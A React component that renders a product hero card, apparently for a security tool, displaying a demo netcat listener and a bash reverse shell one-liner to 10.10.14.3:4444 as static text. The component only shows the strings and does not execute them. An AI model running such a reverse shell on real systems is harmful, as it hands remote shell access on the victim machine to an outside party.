"use client";

import { useTranslations } from "next-intl";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

const DEMO_LISTENER = "nc -lvnp 4444";
const DEMO_PAYLOAD = "bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'";

export function ProductMockupHero() {
  const t = useTranslations("home");

  return (
    <Card className="border-primary/25 bg-card/80 shadow-lg">
      <CardHeader className="pb-2">
        <CardTitle className="text-sm font-medium">
          {t("mockup_title")}
        </CardTitle>
        <p className="text-xs text-muted-foreground">{t("mockup_subtitle")}</p>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="space-y-1">
          <p className="text-[10px] font-medium uppercase tracking-wide text-muted-foreground">
            {t("mockup_listener_label")}
          </p>
          <pre className="overflow-x-auto rounded-md border bg-background p-3 font-mono text-xs leading-relaxed">
            {DEMO_LISTENER}
          </pre>
        </div>
        <div className="space-y-1">
          <p className="text-[10px] font-medium uppercase tracking-wide text-muted-foreground">
            {t("mockup_payload_label")}
          </p>
          <pre className="overflow-x-auto rounded-md border bg-background p-3 font-mono text-xs leading-relaxed break-all whitespace-pre-wrap">
            {DEMO_PAYLOAD}
          </pre>
        </div>
        <p className="text-center text-[10px] text-muted-foreground">
          {t("mockup_footnote")}
        </p>
      </CardContent>
    </Card>
  );
}
